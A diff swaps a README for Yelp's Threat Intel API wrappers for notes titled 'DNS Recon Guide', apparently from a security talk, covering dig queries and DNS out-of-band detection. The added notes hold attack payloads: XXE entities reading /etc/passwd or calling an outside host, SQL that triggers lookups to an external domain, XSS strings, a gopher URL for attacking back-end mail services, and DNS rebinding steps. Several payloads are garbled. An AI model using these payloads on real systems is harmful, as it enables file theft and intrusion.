@@ -1,740 +1,375 @@
-# Introducing Threat Intel
+# DNS Recon Guide
 
 
-[Threat Intel](https://github.com/Yelp/threat_intel) is a set of Threat Intelligence APIs that can be used by security developers and analysts for incident response. Additionally, it contains wrappers for:
+## DNS Recursive requests
 
-* OpenDNS Investigate API
-* VirusTotal API v2.0
-* ShadowServer API
-
-----
-
-### OpenDNS Investigate API
-
-[OpenDNS Investigate](https://investigate.opendns.com/) provides an API that
-allows querying for:
-
- * Domain categorization
- * Security information about a domain
- * Co-occurrences for a domain
- * Related domains for a domain
- * Domains related to an IP
- * Domain tagging dates for a domain
- * DNS RR history for a domain
- * WHOIS information
- - WHOIS information for an email
- - WHOIS information for a nameserver
- - Historical WHOIS information for a domain
- * Latest malicious domains for an IP
-
-To use the Investigate API wrapper import `InvestigateApi` class from `threat_intel.opendns` module:
-
-```python
-from threat_intel.opendns import InvestigateApi
-```
-
-To initialize the API wrapper, you need the API key:
-
-```python
-investigate = InvestigateApi("<INVESTIGATE-API-KEY-HERE>")
-```
-
-You can also specify a file name where the API responses will be cached in a JSON file,
-to save you the bandwidth for the multiple calls about the same domains or IPs:
-
-```python
-investigate = InvestigateApi("<INVESTIGATE-API-KEY-HERE>", cache_file_name="/tmp/cache.opendns.json")
-```
-
-#### Domain categorization
-
-Calls `domains/categorization/?showLabels` Investigate API endpoint.
-It takes a list (or any other Python enumerable) of domains and returns
-the categories associated with these domains by OpenDNS along with a [-1, 0, 1] score, where -1 is a malicious status.
-
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.categorization(domains)
-```
-
-will result in:
+Where did my packet go?
 
 ```
-{
- "baidu.com": {"status": 1, "content_categories": ["Search Engines"], "security_categories": []},
- "google.com": {"status": 1, "content_categories": ["Search Engines"], "security_categories": []},
- "bibikun.ru": {"status": -1, "content_categories": [], "security_categories": ["Malware"]}
-}
+$ nslookup -q=mx <website>
 ```
 
-#### Security information about a domain
-
-Calls `security/name/` Investigate API endpoint.
-It takes any Python enumerable with domains, e.g., list, and returns several security parameters
-associated with each domain.
-
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.security(domains)
-```
-
-will result in:
+???????
 
 ```
-{
- "baidu.com": {
- "found": true,
- "handlings": {
- "domaintagging": 0.00032008666962131285,
- "blocked": 0.00018876906157154347,
- "whitelisted": 0.00019697641207465407,
- "expired": 2.462205150933176e-05,
- "normal": 0.9992695458052232
- },
- "dga_score": 0,
- "rip_score": 0,
-
- ..
-
- }
-}
+192.168.0.1 => 8.8.8.8 => X.root-servers.net => Authoritative server ==> ?
 ```
 
-#### Co-occurrences for a domain
+There are lots of different record types:
 
-Calls `recommendations/name/` Investigate API endpoint.
-Use this method to find out a list of co-occurrence domains (domains that are being accessed by the same users within a small window of time) to the one given in a list, or any other Python enumerable.
+### A: Get an IP address
 
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.cooccurrences(domains)
-```
+```sh
+$ dig @8.8.8.8 -t A www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 140
+;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1
 
-will result in:
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  A
 
-```
-{
- "baidu.com": {
- "found": true,
- "pfs2": [
- ["www.howtoforge.de", 0.14108563836506008],
- }
+;; ANSWER SECTION:
+www.google.com.     151 IN  A   167.206.12.84
+....
 
- ..
-
-}
-```
-
-#### Related domains for a domain
-
-Calls `links/name/` Investigate API endpoint.
-Use this method to find out a list of related domains (domains that have been frequently seen requested around a time window of 60 seconds, but that are not associated with the given domain) to the one given in a list, or any other Python enumerable.
-
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.related_domains(domains)
-```
-
-will result in:
+;; Query time: 46 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 13:55:31 EDT 2014
+;; MSG SIZE rcvd: 299
 
 ```
-{
- "tb1": [
- ["t.co", 11.0],
- ]
 
- ..
+### AAAA: Get an IPv6 address
 
-}
+```sh
+$ dig @8.8.8.8 -t AAAA www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21322
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  AAAA
+
+;; ANSWER SECTION:
+www.google.com.     299 IN  AAAA    2607:f8b0:4006:80a::1011
+
+;; Query time: 31 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 13:55:44 EDT 2014
+;; MSG SIZE rcvd: 71
 ```
 
-#### Domain tagging dates for a domain
+### MX: Mail server
+```sh
+$ dig @8.8.8.8 -t MX www.google.com
+; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t MX www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63724
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
 
-Calls `domains/name/` Investigate API endpoint.
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  MX
 
-Use this method to get the date range when the domain being queried was a part of the OpenDNS block list and how long a domain has been in this list
+;; AUTHORITY SECTION:
+google.com.     41  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
 
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.domain_tag(domains)
+;; Query time: 29 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 13:57:48 EDT 2014
+;; MSG SIZE rcvd: 93
 ```
 
-will result in:
+### CNAME
+
+```sh
+$ dig @8.8.8.8 -t CNAME www.google.com
+
+; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t CNAME www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9080
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  CNAME
+
+;; AUTHORITY SECTION:
+google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
+
+;; Query time: 30 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 13:58:23 EDT 2014
+;; MSG SIZE rcvd: 93
 
 ```
-{
- 'category': u'Malware',
- 'url': None,
- 'period': {
- 'begin': u'2013-09-16',
- 'end': u'Current'
- }
 
- ..
+### TXT: Text Data 
 
-}
+Any sort of binary.
+
+```sh
+dig @8.8.8.8 -t TXT www.google.com
+
+; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t TXT www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39345
+;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;www.google.com.            IN  TXT
+
+;; AUTHORITY SECTION:
+google.com.     59  IN  SOA ns1.google.com. dns-admin.google.com. 1568903 7200 1800 1209600 300
+
+;; Query time: 29 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 13:59:01 EDT 2014
+;; MSG SIZE rcvd: 93
 ```
 
-#### DNS RR history for a Domain
+### Packet Structure
 
-Calls `dnsdb/name/a/` Investigate API endpoint.
-Use this method to find out related domains to domains given in a list, or any other Python enumerable.
+Header:
 
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-investigate.dns_rr(domains)
+
+```sh
+$ dig @8.8.8.8 -t A www.google.com
+; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t A www.google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 25803
+;; flags: qr rd ra; QUERY: 1, ANSWER: 16, AUTHORITY: 0, ADDITIONAL: 1
 ```
 
-will result in:
-
-```
-{
- 'features': {
- 'geo_distance_mean': 0.0,
- 'locations': [
- {
- 'lat': 59.89440155029297,
- 'lon': 30.26420021057129
- }
- ],
- 'rips': 1,
- 'is_subdomain': False,
- 'ttls_mean': 86400.0,
- 'non_routable': False,
- }
-
- ..
-
-}
-```
-
-#### DNS RR history for an IP
-
-Calls `dnsdb/ip/a/` Investigate API endpoint.
-Use this method to find out related domains to the IP addresses given in a list, or any other Python enumerable.
-
-```python
-ips = ['8.8.8.8']
-investigate.rr_history(ips)
-```
-
-will result in:
-
-```
-{
- "8.8.8.8": {
- "rrs": [
- {
- "name": "8.8.8.8",
- "type": "A",
- "class": "IN",
- "rr": "000189.com.",
- "ttl": 3600
- },
- {
- "name": "8.8.8.8",
- "type": "A",
- "class": "IN",
- "rr": "008.no-ip.net.",
- "ttl": 60
- },
- }
-
- ..
-
-}
-```
-
-#### WHOIS information for a domain
-
-##### WHOIS information for an email
-
-Calls `whois/emails/{email}` Investigate API endpoint.
-
-Use this method to see WHOIS information for the email address. (For now, the OpenDNS API will only return at most 500 results)
-
-```python
-emails = ["dns-admin@google.com"]
-investigate.whois_emails(emails)
-```
-
-will result in:
-
-```
-{
- "dns-admin@google.com": {
- "totalResults": 500,
- "moreDataAvailable": true,
- "limit": 500,
- "domains": [
- {
- "domain": "0emm.com",
- "current": true
- },
- ..
- ]
- }
-}
-```
-
-##### WHOIS information for a nameserver
-
-Calls `whois/nameservers/{nameserver}` Investigate API endpoint.
-
-Use this method to see WHOIS information for the nameserver. (For now, the OpenDNS API will only return at most 500 results)
-
-```python
-nameservers = ["ns2.google.com"]
-investigate.whois_nameservers(nameservers)
-```
-
-will result in:
-
-```
-{
- "ns2.google.com": {
- "totalResults": 500,
- "moreDataAvailable": true,
- "limit": 500,
- "domains": [
- {
- "domain": "46645.biz",
- "current": true
- },
- ..
- ]
- }
-}
-```
-
-##### WHOIS information for a domain
-
-Calls `whois/{domain}` Investigate API endpoint.
-
-Use this method to see WHOIS information for the domain.
-
-```python
-domains = ["google.com"]
-investigate.whois_domains(domains)
-```
-
-will result in:
-
-```
-{
- "administrativeContactFax": null,
- "whoisServers": null,
- "addresses": [
- "1600 amphitheatre parkway",
- "please contact contact-admin@google.com, 1600 amphitheatre parkway",
- "2400 e. bayshore pkwy"
- ],
- ..
-}
-```
-
-##### Historical WHOIS information for a domain
-
-Calls `whois/{domain}/history` Investigate API endpoint.
-
-Use this method to see historical WHOIS information for the domain.
-
-```python
-domains = ["5esb.biz"]
-investigate.whois_domains_history(domains)
-```
-
-will result in:
-
-```
-{
- '5esb.biz':[
- {
- u'registrantFaxExt':u'',
- u'administrativeContactPostalCode':u'656448',
- u'zoneContactCity':u'',
- u'addresses':[
- u'nan qu hua yuan xiao he'
- ],
- ..
- },
- ..
- ]
-}
-```
-
-#### Latest malicious domains for an IP
-
-Calls `ips/{ip}/latest_domains` Investigate API endpoint.
-
-Use this method to see whether the IP address has any malicious domains associated with it.
-
-```python
-ips = ["8.8.8.8"]
-investigate.latest_malicious(ips)
-```
-
-will result in:
-
-```
-{
- [
- '7ltd.biz',
- 'co0s.ru',
- 't0link.in',
- ]
-
- ..
-}
-```
-
-----
-
-### VirusTotal API
-
-[VirusTotal](https://www.virustotal.com/) provides an
-[API](https://www.virustotal.com/en/documentation/public-api/) that makes it
-possible to query for the reports about:
-
- * Domains
- * URLs
- * IPs
- * File hashes
- * File Upload
- * Live Feed
- * Advanced search
-
-To use the VirusTotal API wrapper import `VirusTotalApi` class from `threat_intel.virustotal` module:
-
-```python
-from threat_intel.virustotal import VirusTotalApi
-```
-
-To initialize the API wrapper, you need the API key:
-
-```python
-vt = VirusTotalApi("<VIRUSTOTAL-API-KEY-HERE>")
-```
-
-VirusTotal API calls allow squeezing a list of file hashes or URLs into a single HTTP call.
-Depending on the API version you are using (public or private) you may need to tune the maximum number
-of the resources (file hashes or URLs) that could be passed in a single API call.
-You can do it with the `resources_per_req` parameter:
-
-```python
-vt = VirusTotalApi("<VIRUSTOTAL-API-KEY-HERE>", resources_per_req=4)
-```
-
-When using the public API your standard request rate allows you too put maximum 4 resources per request.
-With private API you are able to put up to 25 resources per call. That is also the default value if you
-don't pass the `resources_per_req` parameter.
-
-Of course, when calling the API wrapper methods in the `VirusTotalApi` class, you can pass as many resources
-as you want and the wrapper will take care of producing as many API calls as necessary to satisfy the request rate.
-
-Similarly to OpenDNS API wrapper, you can also specify the file name where the responses will be cached:
-
-```python
-vt = VirusTotalApi("<VIRUSTOTAL-API-KEY-HERE>", cache_file_name="/tmp/cache.virustotal.json")
-```
-
-#### Domain report endpoint
-
-Calls `domain/report` VirusTotal API endpoint.
-Pass a list or any other Python enumerable containing the domains:
-
-```python
-domains = ["google.com", "baidu.com", "bibikun.ru"]
-vt.get_domain_reports(domains)
-```
-
-will result in:
-
-```
-{
- "baidu.com": {
- "undetected_referrer_samples": [
- {
- "positives": 0,
- "total": 56,
- "sha256": "e3c1aea1352362e4b5c008e16b03810192d12a4f1cc71245f5a75e796c719c69"
- }
- ],
-
- ..
-
- }
-}
-```
-
-
-#### URL report endpoint
-
-Calls `url/report` VirusTotal API endpoint.
-Pass a list or any other Python enumerable containing the URL addresses:
-
-```python
-urls = ["http://www.google.com", "http://www.yelp.com"]
-vt.get_url_reports(urls)
-```
-
-will result in:
-
-```
-{
- "http://www.google.com": {
- "permalink": "https://www.virustotal.com/url/dd014af5ed6b38d9130e3f466f850e46d21b951199d53a18ef29ee9341614eaf/analysis/1423344006/",
- "resource": "http://www.google.com",
- "url": "http://www.google.com/",
- "response_code": 1,
- "scan_date": "2015-02-07 21:20:06",
- "scan_id": "dd014af5ed6b38d9130e3f466f850e46d21b951199d53a18ef29ee9341614eaf-1423344006",
- "verbose_msg": "Scan finished, scan information embedded in this object",
- "filescan_id": null,
- "positives": 0,
- "total": 62,
- "scans": {
- "CLEAN MX": {
- "detected": false,
- "result": "clean site"
- },
- }
- ..
-
-}
-```
-
-#### URL scan endpoint
-
-Calls 'url/scan' VirusTotal API endpoint.
-Submit a url or any other Python enumerable containing the URL addresses:
-
-```python
-urls = ["http://www.google.com", "http://www.yelp.com"]
-vt.post_url_report(urls)
-```
-
-#### Hash report endpoint
-
-Calls `file/report` VirusTotal API endpoint.
-You can request the file reports passing a list of hashes (md5, sha1 or sha2):
-
-```python
-file_hashes = [
- "99017f6eebbac24f351415dd410d522d",
- "88817f6eebbac24f351415dd410d522d"
-]
-
-vt.get_file_reports(file_hashes)
-```
-
-will result in:
-
-```
-{
- "88817f6eebbac24f351415dd410d522d": {
- "response_code": 0,
- "resource": "88817f6eebbac24f351415dd410d522d",
- "verbose_msg": "The requested resource is not among the finished, queued or pending scans"
- },
- "99017f6eebbac24f351415dd410d522d": {
- "scan_id": "52d3df0ed60c46f336c131bf2ca454f73bafdc4b04dfa2aea80746f5ba9e6d1c-1423261860",
- "sha1": "4d1740485713a2ab3a4f5822a01f645fe8387f92",
- }
-
- ..
-
-}
-```
-
-#### Hash rescan endpoint
-
-Calls `file/rescan` VirusTotal API endpoint. Use to rescan a previously submitted file.
-You can request the file reports passing a list of hashes (md5, sha1 or sha2):
-
-#### Hash behavior endpoint
-
-Calls `file/behaviour` VirusTotal API endpoint. Use to get a report about the behavior of the file when executed in a sandboxed environment (Cuckoo sandbox).
-You can request the file reports passing a list of hashes (md5, sha1 or sha2):
-
-```python
-file_hashes = [
- "99017f6eebbac24f351415dd410d522d",
- "88817f6eebbac24f351415dd410d522d"
-]
-
-vt.get_file_behaviour(file_hashes)
-```
-
-#### Hash network-traffic endpoint
-
-Calls `file/network-traffic` VirusTotal API endpoint. Use to get the dump of the network traffic generated by the file when executed.
-You can request the file reports passing a list of hashes (md5, sha1 or sha2):
-
-```python
-file_hashes = [
- "99017f6eebbac24f351415dd410d522d",
- "88817f6eebbac24f351415dd410d522d"
-]
-
-vt.get_file_network_traffic(file_hashes)
-```
-
-#### Hash download endpoint
-
-Calls `file/download` VirusTotal API endpoint. Use to download a file by its hash.
-You can request the file reports passing a list of hashes (md5, sha1 or sha2):
-
-```python
-file_hashes = [
- "99017f6eebbac24f351415dd410d522d",
- "88817f6eebbac24f351415dd410d522d"
-]
-
-vt.get_file_download(file_hashes)
-```
-
-#### IP reports endpoint
-
-Calls `ip-address/report` VirusTotal API endpoint.
-Pass a list or any other Python enumerable containing the IP addresses:
-
-```python
-ips = ['90.156.201.27', '198.51.132.80']
-vt.get_ip_reports(ips)
-```
-
-will result in:
-
-```
-{
- "90.156.201.27": {
- "asn": "25532",
- "country": "RU",
- "response_code": 1,
- "as_owner": ".masterhost autonomous system",
- "verbose_msg": "IP address found in dataset",
- "resolutions": [
- {
- "last_resolved": "2013-04-01 00:00:00",
- "hostname": "027.ru"
- },
- {
- "last_resolved": "2015-01-20 00:00:00",
- "hostname": "600volt.ru"
- },
-
- ..
-
- ],
- "detected_urls": [
- {
- "url": "http://shop.albione.ru/",
- "positives": 2,
- "total": 52,
- "scan_date": "2014-04-06 11:18:17"
- },
- {
- "url": "http://www.orlov.ru/",
- "positives": 3,
- "total": 52,
- "scan_date": "2014-03-05 09:13:31"
- }
- ],
- },
-
- "198.51.132.80": {
-
- ..
-
- }
-}
-```
-
-#### URL live feed endpoint
-
-Calls `url/distribution` VirusTotal API endpoint. Use to get a live feed with the latest URLs submitted to VirusTotal.
-
-```python
-vt.get_url_distribution()
-```
-
-#### Hash live feed endpoint
-
-Calls `file/distribution` VirusTotal API endpoint. Use to get a live feed with the latest Hashes submitted to VirusTotal.
-
-```python
-vt.get_file_distribution()
-```
-
-#### Hash search endpoint
-
-Calls `file/search` VirusTotal API endpoint. Use to search for samples that match some binary/metadata/detection criteria.
-
-```python
-vt.get_file_search()
-```
-
-#### File date endpoint
-
-Calls `file/clusters` VirusTotal API endpoint. Use to list similarity clusters for a given time frame.
-
-```python
-vt.get_file_clusters()
+Where:
+
+* ID
+* Opcode
+* flags: qr rd ra
+* status: RCODE
+* QUERY
+* ANSWER
+* AUTHORITY
+* ADDTIONAL
+* 
+
+A query for ANY works because the TYPE of record is returned:
+
+```sh
+$ dig @8.8.8.8 -t ANY google.com
+
+; <<>> DiG 9.9.4-P2-RedHat-9.9.4-15.P2.fc20 <<>> @8.8.8.8 -t ANY google.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 64648
+;; flags: qr rd ra; QUERY: 1, ANSWER: 28, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 512
+;; QUESTION SECTION:
+;google.com.            IN  ANY
+
+;; ANSWER SECTION:
+google.com.     299 IN  A   167.206.10.221
+...
+google.com.     21599   IN  SOA ns1.google.com. dns-admin.google.com. 2014021800 7200 1800 1209600 300
+google.com.     3599    IN  TXT "v=spf1 include:_spf.google.com ip4:216.73.93.70/31 ip4:216.73.93.72/31 ~all"
+google.com.     599 IN  MX  40 alt3.aspmx.l.google.com.
+...
+
+;; Query time: 30 msec
+;; SERVER: 8.8.8.8#53(8.8.8.8)
+;; WHEN: Mon Sep 29 15:14:48 EDT 2014
+;; MSG SIZE rcvd: 640
 ```
 
 ---
 
-### ShadowServer API
 
-[ShadowServer](http://shadowserver.org/) provides an [API](http://bin-test.shadowserver.org/) that allows to test
-the hashes against a list of known software applications.
+## Reverse DNS
 
-To use the ShadowServer API wrapper import `ShadowServerApi` class from `threat_intel.shadowserver` module:
+Works identically, but has a record of the type of PTR (and particular way of formatting the IP address backward).
 
-```python
-from threat_intel.shadowserver import ShadowServerApi
-```
+How frequently is it trusted?
 
-To use the API wrapper simply call the `ShadowServerApi` initializer:
-
-```python
-ss = ShadowServerApi()
-```
-
-You can also specify the file name where the API responses will be cached:
-
-```python
-ss = ShadowServerApi(cache_file_name="/tmp/cache.shadowserver.json")
-```
-
-To check whether the hashes are on the ShadowServer list of known hashes,
-call `get_bin_test` method and pass enumerable with the hashes you want to test:
-
-```python
-file_hashes = [
- "99017f6eebbac24f351415dd410d522d",
- "88817f6eebbac24f351415dd410d522d"
-]
-
-ss.get_bin_test(file_hashes)
-
-```
 
 ---
 
-## Installation
+## Security 
 
-### Install with `pip`
 
-```shell
-$ pip install threat_intel
+### Recon with DNS
+
+DNS is allowed off every network. Most traffic gets blocked by firewalls, but not the internet. DNS traffic foes through the router.
+
+All requests to *.somesite.com go to its DNS server.
+
+
+
+### Cross-site Scripting in Logs
+
+Cross-site scripting occurs when HTML runs in somebody else's browser.
+
+For example, you can set the user-agent to `<img src="http://somesite.com/img.jpg">` and then watch the DNS server.
+
+1. HTTP Request is sent to a vulnerable server.
+2. HTML is returned.
+3. DNS request is sent.
+4. NXDOMAIN = "host not found"
+
+So:
+
+1. A packet capture will look completely innocent.
+2. We aren't directly connecting off the network so firewalls will never know.
+
+We can tell when a service wants to make a connection, without the connection succeeding, and without the service even attempting to make the connection.
+
+
+
+### SQL Injection
+
+Two SQL queries that should cause a DNS lookup:
+
+```
+EXEC sp_addlinkedserver 'somsite.com'. N'A';
 ```
 
-### Testing
-Go to town with `make`:
+and
 
-```shell
-$ sudo pip install tox
-$ make test
 ```
+SELECT 1 INTO OUTFILE "\\cba.skullseclabs.org\C$";
+```
+
+Results: data theft, shell access, arbitrary read.
+
+
+### XXE
+
+XXE: returns to XML external entity attacks and lets you include files from the filesystem.
+
+```
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;></foo>
+```
+
+And also files from remote servers:
+
+```
+<!ENTITY xxe SYSTEM "http://www.google.ca">]>
+<foo>&xee;</foo>
+```
+
+### Finding XXE
+
+Grab a resource from a domain:
+
+```
+<!ENTITY xxe SYSTEM "http://aab.skullseclabs.org">]>
+
+<foo> &xxe; </foo>
+```
+
+Even if there is a firewall, and a weird filesystem and the file isn't send back to the user, you can still detect XXE!
+
+### Gopher
+
+If you ask a server to make a request for:
+
+```
+gopher://internal-ip:25/AHELO%0AMAIL+FROM...
+```
+
+If you can get a service to fetch an arbitrary gopher://URL, such as through XXE, you can attack back-end services.
+
+Having to use DNS to exploit this is unlikely.
+
+## PHP bad fopen()
+
+Very similar to XXE.
+
+Old versions of PHP allowed Internet links (http://...) in fopen()
+
+Arbitrary file read, gopher:// issues again.
+
+
+### Shell injection
+
+Simply inject a DNS lookup into every field.
+
+Full server access
+
+
+### DNS Lookups
+
+Untrusted.
+
+Exploit:
+
+Setting TXT record will change email field to a list of databases:
+
+```sql
+$addr = gethostbyaddr($_SERVER['REMOTE_ADDR']))
+$details = print_r(dns_get_record($addr), true);
+mysql_query("UPDATE users SET password='$details' WHERE username="$username'");
+```
+
+### Cross-site scripting
+
+The following is a valid CNAME, MX, TXT, PTR:
+
+```
+<script/src="http://javaop.com/test-js.js'></script>
+```
+
+
+### DNS Re-binding
+
+First, we look at how you can smuggle untrusted data to a protected server.
+Then how to smuggle data off a protected server to the attack.
+
+1. The user ends up at a evil page. They look it up via DNS.
+
+2. The user is sent to an evil server.
+
+3. While there, a session is created (authentication, cookies, etc.)
+
+4. The session refreshes, with another DNS lookup
+
+5. This time the evil DNS server sends them to a trusted service. The browser does not realize the server has changed.
+
+6. The session eventually refreshes, triggering another DNS lookup
+
+7. Any cookies/local storage/etc. can be accessed. The browser thinks its the same origin.
+
+This show two attacks:
+
+1. Using re-binding to sneak data into a trusted context by switching from an evil IP to a trusted one.
+2. Using re-binding to sneak data out of a trusted context by switching from a trusted IP to an evil one.
+
+
+
+Advice:
+
+- Look at you DNS traffic, keep an eye for anomalies
+- A spike in traffic can mean a DNS backdoor or some malware. ☠️
